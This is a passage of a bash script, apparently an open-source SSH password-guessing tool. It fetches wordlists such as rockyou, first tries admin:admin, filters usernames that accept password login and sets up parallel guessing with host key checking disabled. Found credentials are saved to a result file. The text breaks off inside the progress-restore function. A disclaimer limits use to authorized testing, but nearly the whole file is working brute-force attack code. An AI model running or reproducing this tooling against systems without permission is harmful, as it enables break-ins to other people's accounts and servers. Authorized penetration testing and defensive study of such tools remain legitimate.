#!/usr/bin/env bash
#
# getsshpass.sh - SSH dictionary attack tool for authorized security auditing.
# Use only on systems you own or have explicit written permission to test.
#
# Copyright (C) 2016-2026:
#
# - Radovan Brezula 'brezular'
# - Blai Peidro
#
# License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
# This is free software: you are free to change and redistribute it.
# There is NO WARRANTY, to the extent permitted by law.

# Fail a pipeline if any command in it fails, not just the last
set -o pipefail

##############################
# Constants and globals
##############################

readonly VERSION="1.1"                                  # edit on every release
readonly SCRIPT_DIR="$(cd "$(dirname "${0}")" && pwd)"  # script absolute path
readonly STATE_BASE="${SCRIPT_DIR}/.getsshpass"         # per-host subdirs
readonly RETRY_SLEEP="0.05" # sleep between SSH connection error retries
readonly POLL_SLEEP="0.05"  # sleep between job-slot availability polls

declare ASKPASS_SCRIPT=""     # path to temp SSH_ASKPASS helper script
declare STATE_DIR=""          # per-host state subdirectory path
declare RESULT_FILE=""        # path to result.txt (found credentials)
declare RESUME_FILE=""        # path to resume.txt (last attempted pair)
declare FILTERED_USERLIST=""  # path to filtered_users.txt (users with password)

declare port="22"         # target SSH port
declare delay="0.04"      # delay between attempts in seconds
declare max_jobs="0"      # max parallel SSH jobs; 0 = unlimited
declare max_retries="50"  # max retries per attempt on SSH errors (255)
declare ssh_timeout="8"   # SSH connection timeout in seconds

declare host=""            # target SSH hostname or IP
declare clear_state=""     # set by --clear flag
declare list_wordlists=""  # set by --list flag
declare use_sshpass=""     # set by --sshpass flag
declare userlist=""        # active username file (trimmed on resume)
declare userlist_orig=""   # original username file path (for .new cleanup)
declare passlist=""        # active password file (trimmed on resume)
declare passlist_orig=""   # original password file path (for .new cleanup)
declare fullpasslist=""    # full password file path (for total count)
declare fulluserlist=""    # full username file path (for total count)

declare -a CHILD_PIDS=()      # child PIDs for cleanup
declare -a download_names=()  # wordlists to fetch (-f/--fetch)

declare -i attempt=0         # running attempt counter
declare -i total_attempts=0  # total combinations to try
declare -i maxusercount=0    # total users (set in restore_progress, read by progress_bar_setup)
declare -i maxpasscount=0    # total passwords (set in restore_progress, read by progress_bar_setup)

##############################
# Terminal colors and logging
##############################

# Enable colors only when stdout is a terminal (not piped/redirected)
if [[ -t 1 ]]; then
  readonly RED='\033[0;31m'
  readonly GREEN='\033[0;32m'
  readonly YELLOW='\033[1;33m'
  readonly CYAN='\033[0;36m'
  readonly BOLD='\033[1m'
  readonly RESET='\033[0m'
else
  readonly RED='' GREEN='' YELLOW='' CYAN='' BOLD='' RESET=''
fi

# Logging functions - all user-facing output goes through these.
# %(%Y-%m-%d %H:%M:%S)T is bash 4.2+ builtin timestamp (-1 = now).
# %b expands ANSI escape sequences for colors.
msg_ok() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bOK   %b] %s\n' \
    -1 "${GREEN}" "${RESET}" "${*}"
}

msg_fail() {
  printf 'Error: %s\n' "${*}" >&2
}

msg_warn() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bWARN %b] %s\n' \
    -1 "${YELLOW}" "${RESET}" "${*}" >&2
}

msg_error() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bERROR%b] %s\n' \
    -1 "${RED}" "${RESET}" "${*}" >&2
}

msg_info() {
  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] %s\n' \
    -1 "${CYAN}" "${RESET}" "${*}"
}

##############################
# Usage and version
##############################

# Print ASCII banner.
banner() {
  cat <<'EOF'
                __                 __
   _____  _____/  |_  ______ _____|  |__ ___________    ______ ______
  / ___ \/ __ \   __\/  ___//  ___/  |  \\____ \__  \  /  ___//  ___/
 / /_/  /  ___/|  |  \___ \ \___ \|   Y  \  |_\ / __ \_\___  \\___  \
 \___  / \___  |__| /____  \____  \___|  /   __(____  /____  /____  /
/_____/      \/          \/     \/     \/|__|       \/     \/     \/

EOF
}

# Print usage information and available options.
usage() {
  banner
  cat <<EOF
                                                               v${VERSION}

Usage: $(basename "${0}") [OPTIONS]

OPTIONS:
   -a, --attack HOST      IP address or hostname of target SSH host
   -p, --port PORT        TCP port 1-65535 of target SSH host [default: 22]
   -u, --users FILE       Path to file with usernames
   -d, --dictionary FILE  Path to file with passwords
   -w, --wait SECS        Delay between attempts in seconds (e.g. 1, 0.1, 0.0) [default: 0.04]
   -j, --jobs JOBS        Maximum parallel SSH attempts, 0 = unlimited [default: 0]
   -r, --retries N        Max retries per attempt on transient SSH errors [default: 50]
   -t, --timeout SECS     SSH connection timeout in seconds [default: 8]
   -c, --clear            Clear all state files (results, resume, filtered users)
   -f, --fetch NAME       Download a wordlist (top-usernames, rockyou, 10k, 100k)
   -l, --list             List available wordlists
   -s, --sshpass          Use sshpass instead of SSH_ASKPASS (requires sshpass)
   -v, --version          Display version
   -h, --help             Display help

EXAMPLES:
   $(basename "${0}") -a 192.168.1.1 -p 22 -u users.txt -d rockyou.txt
   $(basename "${0}") -a server.local -u users.txt -d rockyou.txt -w 0.5 -j 3
   $(basename "${0}") --fetch rockyou
   $(basename "${0}") -f 10k
EOF
}

# Print version and license information.
version() {
  banner
  cat <<EOF
                                                               v${VERSION}

Copyright (C) 2016-2026:

- Radovan Brezula 'brezular'
- Blai Peidro

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
EOF
  exit 0
}

##############################
# State management
##############################

# Initialize per-host state directory paths.
init_state_dir() {
  STATE_DIR="${STATE_BASE}/${host}"
  RESULT_FILE="${STATE_DIR}/result.txt"
  RESUME_FILE="${STATE_DIR}/resume.txt"
  FILTERED_USERLIST="${STATE_DIR}/filtered_users.txt"
}

# Remove state files for a specific host or all hosts.
clear_state_files() {
  if [[ -n "${host}" ]]; then
    rm -rf "${STATE_BASE}/${host}"
    printf 'State files cleared for host '\''%s'\''\n' "${host}"
  else
    rm -rf "${STATE_BASE}"
    printf 'All state files cleared\n'
  fi
}

# Terminate all tracked child processes and remove temporary files.
cleanup() {
  for pid in "${CHILD_PIDS[@]}"; do
    kill "${pid}" 2>/dev/null
    wait "${pid}" 2>/dev/null
  done
  CHILD_PIDS=()

  # Remove .new temp files created by restore_progress (tail output)
  [[ -n "${userlist_orig}" && -f "${userlist_orig}.new" ]] \
    && rm -f "${userlist_orig}.new"
  [[ -n "${passlist_orig}" && -f "${passlist_orig}.new" ]] \
    && rm -f "${passlist_orig}.new"

  [[ -n "${ASKPASS_SCRIPT}" && -f "${ASKPASS_SCRIPT}" ]] \
    && rm -f "${ASKPASS_SCRIPT}"
}

##############################
# Wordlists
##############################

# Print available wordlists from the catalog file.
list_available_wordlists() {
  local catalog="${SCRIPT_DIR}/wordlists.txt"

  if [[ ! -f "${catalog}" ]]; then
    msg_fail "Wordlist catalog not found: '${catalog}'"
    exit 1
  fi

  local col_width=0
  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
    [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
    (( ${#wl_name} > col_width )) && col_width=${#wl_name}
  done < "${catalog}"

  printf 'Available wordlists:\n\n'
  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
    [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
    printf "%-${col_width}s  %s\n" "${wl_name}" "${wl_desc}"
  done < "${catalog}"
}

# Download a wordlist from the catalog file (wordlists.txt).
download_wordlist() {
  local catalog="${SCRIPT_DIR}/wordlists.txt"

  if [[ ! -f "${catalog}" ]]; then
    msg_fail "Wordlist catalog not found: '${catalog}'"
    exit 1
  fi

  if ! command -v curl &>/dev/null; then
    msg_fail \
      "Utility 'curl' not found. Install it with your package manager."
    exit 1
  fi

  local name="${1}"
  local found=0

  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
    wl_url="${wl_url%$'\r'}"
    [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
    if [[ "${name}" == "${wl_name}" ]]; then
      found=1
      if [[ -f "${wl_file}" ]]; then
        msg_warn "File '${wl_file}' already exists, skipping"
        return
      fi
      msg_info "Downloading '${wl_file}' (${wl_desc})..."
      if curl -fSL --progress-bar -o "${wl_file}" "${wl_url}"; then
        local lines
        lines="$(grep -c '' "${wl_file}")"
        # Cursor up + carriage return + clear line:
        # overwrites curl's progress bar
        printf '\033[A\r\033[K'
        local fmt_lines
        format_number "${lines}" fmt_lines
        msg_ok "Downloaded '${wl_file}'" \
          "(${fmt_lines} lines)"
      else
        printf '\033[A\r\033[K'
        msg_fail "Failed to download '${wl_file}'"
        rm -f "${wl_file}"
        return 1
      fi
      break
    fi
  done < "${catalog}"

  if [[ ${found} -eq 0 ]]; then
    msg_fail "Unknown wordlist: '${name}'"
    list_available_wordlists
    return 1
  fi
}

##############################
# Helpers
##############################

# Format NUMBER with thousand separators into VARNAME.
# Usage: format_number NUMBER VARNAME  (e.g. format_number 1234567 result)
# Pure bash, no subprocesses.
format_number() {
  local n="${1}" i len result=""
  len=${#n}
  for (( i=0; i<len; i++ )); do
    (( i > 0 && (len - i) % 3 == 0 )) && result+=","
    result+="${n:i:1}"
  done
  printf -v "${2}" '%s' "${result}"
}

##############################
# Progress bar and time tracking
##############################

# Progress bar pinned at the bottom row; Tried/Remaining lines pinned
# immediately after "Starting attack..." via cursor-position query (DSR).
declare -i PB_ROWS=0
declare -i PB_COLS=0
declare PB_FMT_TOTAL=""
declare -i PB_BAR_WIDTH=0
declare -i PB_TRIED_ROW=0
declare -i PB_REMAIN_ROW=0
declare -i PB_DRAW_ROW=0     # row where the current attempt line is always drawn
declare -i PB_SCROLL_BOTTOM=0 # bottom row of the scroll region

progress_bar_setup() {
  local is_resize="${1:-0}"
  PB_ROWS="$(tput lines 2>/dev/null)"
  PB_COLS="$(tput cols 2>/dev/null)"
  PB_TRIED_ROW=0; PB_REMAIN_ROW=0; PB_DRAW_ROW=0; PB_SCROLL_BOTTOM=0
  (( PB_ROWS > 4 && PB_COLS > 0 )) || return
  format_number "${total_attempts}" PB_FMT_TOTAL
  local max_label="${PB_FMT_TOTAL}/${PB_FMT_TOTAL}"
  PB_BAR_WIDTH=$(( PB_COLS - 10 - ${#max_label} ))
  (( PB_BAR_WIDTH < 10 )) && PB_BAR_WIDTH=10

  # Query cursor row via ANSI DSR (ESC[6n → terminal replies ESC[row;colR).
  local cpr=''
  printf '\033[6n' >/dev/tty
  IFS= read -r -s -d 'R' -t 1 cpr </dev/tty 2>/dev/null
  cpr="${cpr##*\[}"
  local cursor_row="${cpr%%;*}"

  local fmt_tried fmt_remaining
  format_number "${attempt}" fmt_tried
  format_number "$(( total_attempts - attempt ))" fmt_remaining

  if [[ "${cursor_row}" =~ ^[0-9]+$ ]] \
      && (( cursor_row >= 1 && cursor_row + 3 < PB_ROWS )); then
    PB_TRIED_ROW="${cursor_row}"
    PB_REMAIN_ROW=$(( cursor_row + 1 ))
    # Print Tried and Remaining right here — they stay pinned above the
    # scroll region that starts on the next line.
    printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords tried:             %s\n' \
      -1 "${CYAN}" "${RESET}" "${fmt_tried}"
    printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords remaining:         %s\n' \
      -1 "${CYAN}" "${RESET}" "${fmt_remaining}"
    # Layout: Tried, Remaining, attempt (PB_DRAW_ROW), scroll region, bar.
    # Attempt is pinned right below Remaining (outside the scroll region so
    # background \n cannot scroll it away). DECSTBM homes cursor to row 1;
    # move it to PB_SCROLL_BOTTOM so background writes stay in the region.
    PB_DRAW_ROW=$(( PB_REMAIN_ROW + 1 ))
    PB_SCROLL_BOTTOM=$(( PB_ROWS - 1 ))
    printf '\033[%d;%dr\033[%d;1H\033[?25l' \
      "$(( PB_DRAW_ROW + 1 ))" "$(( PB_ROWS - 1 ))" \
      "$(( PB_ROWS - 1 ))"
  else
    # DSR unavailable or cursor too close to bottom — fall back to reserving
    # 5 bottom rows: Tried (PB_ROWS-4), Remaining (PB_ROWS-3), attempt
    # (PB_ROWS-2), blank (PB_ROWS-1), bar (PB_ROWS). Scroll region is 1 to
    # PB_ROWS-5; the blank row visually separates the attempt line from the bar.
    PB_SCROLL_BOTTOM=$(( PB_ROWS - 5 ))
    if (( PB_SCROLL_BOTTOM < 1 )); then
      PB_TRIED_ROW=0; PB_REMAIN_ROW=0; PB_DRAW_ROW=0; PB_SCROLL_BOTTOM=0
      return
    fi
    PB_TRIED_ROW=$(( PB_ROWS - 4 ))
    PB_REMAIN_ROW=$(( PB_ROWS - 3 ))
    PB_DRAW_ROW=$(( PB_ROWS - 2 ))
    # Set scroll region and hide cursor.
    printf '\033[1;%dr\033[?25l' "${PB_SCROLL_BOTTOM}"
    # On a fresh setup (not a resize), the stats lines (Users, Passwords,
    # Combinations, Starting attack...) may have scrolled into the reserved
    # rows and been lost. Reprint them into the scroll region by positioning
    # at PB_SCROLL_BOTTOM and printing with \n — each \n scrolls the region
    # up one row, placing the line safely above PB_TRIED_ROW.
    if (( ! is_resize )); then
      local fmt_val
      format_number "${maxusercount}" fmt_val
      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Users:                       %s\n' \
        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
      format_number "${maxpasscount}" fmt_val
      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords:                   %s\n' \
        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
      format_number "${total_attempts}" fmt_val
      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Combinations:                %s\n' \
        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
      if (( attempt > 0 )); then
        format_number "${attempt}" fmt_val
        printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Previously tried passwords:  %s\n' \
          "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
      fi
      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Starting attack...' \
        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}"
    fi
    # Erase reserved rows, then park cursor at scroll region bottom.
    printf '\033[%d;1H\033[J\033[%d;1H' \
      "${PB_TRIED_ROW}" "${PB_SCROLL_BOTTOM}"
  fi
}

progress_bar_draw() {
  # Jump to PB_DRAW_ROW (absolute) so background subprocesses that wrote \n
  # and moved the cursor elsewhere don't cause the attempt line to land on
  # a pinned row. \033[K clears the line; \033[?7l disables wrap.
  printf '\033[%d;1H\033[K\033[?7l' "${PB_DRAW_ROW}"
  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] ' \
    -1 "${CYAN}" "${RESET}"
  printf \
    'Trying user: '\''%b%s%b'\'' password: '\''%b%s%b'\''' \
    "${CYAN}" "${1}" "${RESET}" \
    "${YELLOW}" "${2}" "${RESET}"
  printf '\033[?7h'
}

progress_bar_update() {
  local current="${1}" total="${2}"
  local pct filled empty fmt_current fmt_remaining fill_str empty_str
  if (( total > 0 )); then
    pct=$(( current * 100 / total ))
  else
    pct=0
  fi
  format_number "${current}" fmt_current
  format_number "$(( total - current ))" fmt_remaining
  filled=$(( pct * PB_BAR_WIDTH / 100 ))
  empty=$(( PB_BAR_WIDTH - filled ))
  printf -v fill_str '%*s' "${filled}" ''
  printf -v empty_str '%*s' "${empty}" ''
  printf '\033[%d;1H\033[K\033[?7l' "${PB_TRIED_ROW}"
  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords tried:             %s\033[?7h' \
    -1 "${CYAN}" "${RESET}" "${fmt_current}"
  printf '\033[%d;1H\033[K\033[?7l' "${PB_REMAIN_ROW}"
  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords remaining:         %s\033[?7h' \
    -1 "${CYAN}" "${RESET}" "${fmt_remaining}"
  printf '\033[%d;1H\033[K\033[?7l[%b%s%b] %3d%% | %s/%s\033[?7h' \
    "${PB_ROWS}" "${GREEN}" "${fill_str// /█}${empty_str}" \
    "${RESET}" "${pct}" "${fmt_current}" "${PB_FMT_TOTAL}"
  # Return cursor to scroll region bottom so background subprocesses writing
  # \n stay inside the scroll region and cannot land on a pinned row.
  printf '\033[%d;1H' "${PB_SCROLL_BOTTOM}"
}

progress_bar_clear() {
  (( PB_TRIED_ROW > 0 )) || return
  local rows
  rows="$(tput lines 2>/dev/null)"
  (( rows > 0 )) || rows="${PB_ROWS}"
  # Reset scroll region and restore cursor unconditionally — if tput failed
  # and we skipped this, the scroll region would stay active after exit.
  # Use \033[r (no-param DECSTBM) as belt-and-suspenders reset.
  printf '\033[r\033[1;%dr\033[?25h' "${rows}"
  # DECSTBM above homes cursor to row 1; move to PB_TRIED_ROW and erase down.
  printf '\033[%d;1H\033[J' "${PB_TRIED_ROW}"
}

elapsed_time() {
  local dt=${SECONDS}
  local dd=$(( dt / 86400 ))
  local dh=$(( (dt % 86400) / 3600 ))
  local dm=$(( (dt % 3600) / 60 ))
  local ds=$(( dt % 60 ))

  local result=""
  (( dd > 0 )) && result+="${dd}d "
  (( dh > 0 )) && result+="${dh}h "
  (( dm > 0 )) && result+="${dm}m "
  result+="${ds}s"

  msg_info "Elapsed time: ${result}"
}

##############################
# Argument parsing and validation
##############################

# Parse command-line arguments.
read_args() {
  if [[ ${#} -eq 0 ]]; then
    usage
    exit 0
  fi

  while [[ ${#} -gt 0 ]]; do
    case "${1}" in
      -a|--attack)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        host="${2}"
        shift 2
        ;;
      -p|--port)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        port="${2}"
        shift 2
        ;;
      -u|--users)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        userlist="${2}"
        userlist_orig="${userlist}"
        shift 2
        ;;
      -d|--dictionary)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        passlist="${2}"
        passlist_orig="${passlist}"
        shift 2
        ;;
      -w|--wait)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        delay="${2}"
        shift 2
        ;;
      -j|--jobs)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        max_jobs="${2}"
        shift 2
        ;;
      -r|--retries)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        max_retries="${2}"
        shift 2
        ;;
      -t|--timeout)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        ssh_timeout="${2}"
        shift 2
        ;;
      -c|--clear)
        clear_state=1
        shift
        ;;
      -f|--fetch)
        [[ ${#} -lt 2 ]] \
          && { msg_fail "Option ${1} requires an argument"; exit 1; }
        download_names+=("${2}")
        shift 2
        ;;
      -l|--list)
        list_wordlists=1
        shift
        ;;
      -s|--sshpass)
        use_sshpass=1
        shift
        ;;
      -v|--version)
        version
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        msg_fail "Unknown option: ${1}"
        exit 1
        ;;
      *)
        msg_fail "Unexpected argument: ${1}"
        exit 1
        ;;
    esac
  done
}

# Validate the target host as an IPv4 address or hostname.
validate_host() {
  if [[ -z "${host}" ]]; then
    msg_fail "Host address cannot be empty"
    exit 1
  fi

  local ip_regex='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
  if [[ "${host}" =~ ${ip_regex} ]]; then
    IFS='.' read -r -a octets <<< "${host}"
    for octet in "${octets[@]}"; do
      # 10# forces decimal - without it, 08/09 fail as invalid octal
      if (( 10#${octet} > 255 )); then
        msg_fail "'${host}' is not a valid IP address" \
          "(octet ${octet} > 255)"
        exit 1
      fi
    done
  else
    local host_regex='^[a-zA-Z0-9]'
    host_regex+='([a-zA-Z0-9\-]*[a-zA-Z0-9])?'
    host_regex+='(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$'
    if [[ ! "${host}" =~ ${host_regex} ]]; then
      msg_fail \
        "'${host}' is not a valid IP address or hostname"
      exit 1
    fi
  fi
}

# Validate TCP port is a number in range 1-65535.
validate_port() {
  if [[ -z "${port}" ]] \
      || [[ ! "${port}" =~ ^[1-9][0-9]*$ ]] \
      || (( port > 65535 )); then
    msg_fail "TCP port must be a number in range 1-65535"
    exit 1
  fi
}

# Validate all arguments, check dependencies, and initialize state.
check_args() {
  if [[ -n "${list_wordlists}" ]]; then
    list_available_wordlists
    exit 0
  fi

  if [[ ${#download_names[@]} -gt 0 ]]; then
    local dl_failed=0
    for wl_name in "${download_names[@]}"; do
      download_wordlist "${wl_name}" || dl_failed=1
    done
    exit "${dl_failed}"
  fi

  if [[ -n "${clear_state}" ]]; then
    [[ -n "${host}" ]] && validate_host
    clear_state_files
    exit 0
  fi

  if ! command -v ssh &>/dev/null; then
    msg_fail "Utility 'ssh' not found." \
      "Install openssh-client with your package manager."
    exit 1
  fi

  if [[ -n "${use_sshpass}" ]] && ! command -v sshpass &>/dev/null; then
    msg_fail "Utility 'sshpass' not found." \
      "Install it with your package manager."
    exit 1
  fi

  if [[ -z "${use_sshpass}" ]]; then
    local ssh_ver_str ssh_major ssh_minor
    ssh_ver_str="$(ssh -V 2>&1)"
    if [[ "${ssh_ver_str}" =~ OpenSSH_([0-9]+)\.([0-9]+) ]]; then
      ssh_major="${BASH_REMATCH[1]}"
      ssh_minor="${BASH_REMATCH[2]}"
      if (( ssh_major < 8 || (ssh_major == 8 && ssh_minor < 4) )); then
        msg_fail \
          "OpenSSH ${ssh_major}.${ssh_minor} detected;" \
          "SSH_ASKPASS_REQUIRE=force requires OpenSSH 8.4+." \
          "Use -s/--sshpass instead."
        exit 1
      fi
    fi
  fi

  validate_host
  validate_port

  if [[ ! "${max_jobs}" =~ ^(0|[1-9][0-9]*)$ ]]; then
    msg_fail "Maximum parallel jobs (-j/--jobs)" \
      "must be 0 (unlimited) or a positive integer"
    exit 1
  fi

  if [[ ! "${max_retries}" =~ ^[1-9][0-9]*$ ]]; then
    msg_fail \
      "Max retries (-r/--retries) must be a positive integer"
    exit 1
  fi

  if [[ ! "${ssh_timeout}" =~ ^[1-9][0-9]*$ ]]; then
    msg_fail \
      "SSH timeout (-t/--timeout) must be a positive integer"
    exit 1
  fi

  if [[ ! "${delay}" =~ ^[0-9]*\.?[0-9]*$ ]] || [[ -z "${delay//./}" ]]; then
    msg_fail \
      "Delay (-w/--wait) must be a non-negative number"
    exit 1
  fi

  init_state_dir

  if [[ -f "${RESULT_FILE}" ]]; then
    local saved_user saved_pass
    saved_user="$(sed -n \
      "s/.*username: '\\([^']*\\)'.*/\\1/p" "${RESULT_FILE}")"
    saved_pass="$(sed -n \
      "s/.*password: '\\(.*\\)'/\\1/p" "${RESULT_FILE}")"
    printf 'Warning: Previous result found for '\''%s'\'': user '\''%s'\'', password '\''%s'\''\n' \
      "${host}" "${saved_user}" "${saved_pass}"
    printf "Run again anyway? [y/N] "
    read -r answer
    if [[ "${answer}" =~ ^[Yy]$ ]]; then
      clear_state_files
      init_state_dir
    else
      exit 0
    fi
  fi

  local errors=0
  if [[ ! -f "${passlist}" ]]; then
    msg_fail "Cannot find password file: '${passlist:-<not specified>}'"
    (( errors++ ))
  elif [[ ! -r "${passlist}" ]]; then
    msg_fail "Cannot read password file: '${passlist}'"
    (( errors++ ))
  elif [[ ! -s "${passlist}" ]]; then
    msg_fail "Password file is empty: '${passlist}'"
    (( errors++ ))
  fi

  if [[ ! -f "${userlist}" ]]; then
    msg_fail "Cannot find username file: '${userlist:-<not specified>}'"
    (( errors++ ))
  elif [[ ! -r "${userlist}" ]]; then
    msg_fail "Cannot read username file: '${userlist}'"
    (( errors++ ))
  elif [[ ! -s "${userlist}" ]]; then
    msg_fail "Username file is empty: '${userlist}'"
    (( errors++ ))
  fi

  (( errors > 0 )) && exit 1

  mkdir -p "${STATE_DIR}" || {
    msg_fail \
      "Cannot create state directory: '${STATE_DIR}'"
    exit 1
  }

  fullpasslist="${passlist}"
  fulluserlist="${userlist}"
}

##############################
# SSH operations
##############################

# Create a temporary SSH_ASKPASS helper that reads SSH_PASSWORD from the env.
# SSH_ASKPASS_REQUIRE=force (OpenSSH 8.4+) makes SSH call this helper instead
# of prompting, even when a terminal is present.
create_askpass_helper() {
  [[ -n "${use_sshpass}" ]] && return
  ASKPASS_SCRIPT="$(mktemp)" || {
    msg_fail "Cannot create temp file for SSH_ASKPASS helper"
    exit 1
  }
  printf '#!/bin/sh\nprintf "%%s\\n" "${SSH_PASSWORD}"\n' \
    > "${ASKPASS_SCRIPT}" || {
    msg_fail "Cannot write SSH_ASKPASS helper script"
    exit 1
  }
  chmod +x "${ASKPASS_SCRIPT}" || {
    msg_fail "Cannot make SSH_ASKPASS helper script executable"
    exit 1
  }
}

# Quick-win credential test with admin:admin and SSH reachability check.
check_ssh_connection() {
  msg_info "Checking SSH connection to '${host}:${port}'..."

  local rvalssh
  if [[ -n "${use_sshpass}" ]]; then
    sshpass -p admin ssh \
      -o StrictHostKeyChecking=no \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout="${ssh_timeout}" \
      -p "${port}" "admin@${host}" exit &>/dev/null
    rvalssh=${?}
    if [[ "${rvalssh}" -eq 0 ]]; then
      msg_ok "Connection successful"
      printf '%s\n' \
        "Found username: 'admin' and password: 'admin'" \
        > "${RESULT_FILE}"
      evaluate_result
    elif [[ "${rvalssh}" -eq 255 || "${rvalssh}" -eq 3 ]]; then
      msg_error \
        "Cannot establish SSH connection to '${host}:${port}'"
      exit 1
    else
      msg_ok "Connection successful"
    fi
  else
    local ssh_err
    ssh_err=$(SSH_ASKPASS="${ASKPASS_SCRIPT}" SSH_ASKPASS_REQUIRE=force \
      SSH_PASSWORD=admin ssh \
      -o StrictHostKeyChecking=no \
      -o PubkeyAuthentication=no \
      -o NumberOfPasswordPrompts=1 \
      -o ConnectTimeout="${ssh_timeout}" \
      -p "${port}" "admin@${host}" exit 2>&1 >/dev/null)
    rvalssh=${?}
    if [[ "${rvalssh}" -eq 0 ]]; then
      msg_ok "Connection successful"
      printf '%s\n' \
        "Found username: 'admin' and password: 'admin'" \
        > "${RESULT_FILE}"
      evaluate_result
    elif [[ "${rvalssh}" -eq 255 ]] \
        && [[ "${ssh_err}" != *"Permission denied"* ]]; then
      msg_error \
        "Cannot establish SSH connection to '${host}:${port}'"
      exit 1
    else
      msg_ok "Connection successful"
    fi
  fi
}

# Probe usernames with ssh BatchMode to detect password auth.
filter_users_by_password_auth() {
  if [[ -s "${FILTERED_USERLIST}" ]]; then
    local cached_count
    cached_count="$(grep -c '' "${FILTERED_USERLIST}")"
    msg_info "Cached filter: ${cached_count} users allow password authentication"
    printf "Reuse cached list? [Y/n] "
    read -r answer
    if [[ ! "${answer}" =~ ^[Nn]$ ]]; then
      userlist="${FILTERED_USERLIST}"
      userlist_orig="${FILTERED_USERLIST}"
      fulluserlist="${FILTERED_USERLIST}"
      return
    fi
  fi

  msg_info "Filtering users by password authentication..."

  > "${FILTERED_USERLIST}"  # truncate file to start fresh
  local total_users
  total_users="$(grep -c '' "${userlist}")"
  local -a filter_pids=()
  local filter_tmp="${STATE_DIR}/filter_tmp"
  rm -rf "${filter_tmp}"
  mkdir -p "${filter_tmp}"

  # Each user is probed in a parallel subshell. Subshells write
  # a marker file to filter_tmp/<user> if password auth is enabled.
  # We collect results after all probes finish, re-reading the
  # userlist to rebuild filtered_users.txt in original order.
  while IFS= read -r user || [[ -n "${user}" ]]; do
    user="${user%$'\r'}"
    [[ -z "${user}" ]] && continue
    (
      local status
      status="$(ssh \
        -o BatchMode=yes \
        -o StrictHostKeyChecking=no \
        -o PubkeyAuthentication=no \
        -o ConnectTimeout="${ssh_timeout}" \
        -p "${port}" "${user}@${host}" echo ok 2>&1)"
      if [[ "${status}" =~ password|keyboard-interactive ]]; then
        local safe_user="${user//\//%2F}"
        printf '%s\n' "${user}" > "${filter_tmp}/${safe_user}"
      fi
    ) &
    filter_pids+=("${!}")
    CHILD_PIDS+=("${!}")
  done < "${userlist}"
  for pid in "${filter_pids[@]}"; do
    wait "${pid}" 2>/dev/null
  done
  CHILD_PIDS=()

  # Rebuild filtered list preserving original order
  while IFS= read -r user || [[ -n "${user}" ]]; do
    user="${user%$'\r'}"
    [[ -z "${user}" ]] && continue
    local safe_user="${user//\//%2F}"
    [[ -f "${filter_tmp}/${safe_user}" ]] \
      && printf '%s\n' "${user}" >> "${FILTERED_USERLIST}"
  done < "${userlist}"
  rm -rf "${filter_tmp}"

  local filtered_count
  if [[ -s "${FILTERED_USERLIST}" ]]; then
    filtered_count="$(grep -c '' "${FILTERED_USERLIST}")"
  else
    filtered_count=0
  fi

  if [[ ${filtered_count} -eq 0 ]]; then
    msg_warn "No users with password authentication found"
    exit 0
  fi

  msg_info "${filtered_count}/${total_users} users allow password authentication"
  userlist="${FILTERED_USERLIST}"
  userlist_orig="${FILTERED_USERLIST}"
  fulluserlist="${FILTERED_USERLIST}"
}

# Restore progress from a previous interrupted run.
restore_progress() {
  if [[ -f "${RESUME_FILE}" ]]; then
    local resume_line lastuser lastpass
    IFS= read -r resume_line < "${RESUME_FILE}"
    lastuser="${resume_line%%$'\t'*}"
    lastpass="${resume_line#*$'\t'}"

    if [[ "${resume_line}" != *$'\t'* \
        || -z "${lastuser}" || -z "${lastpass}" ]]; then
      msg_warn \
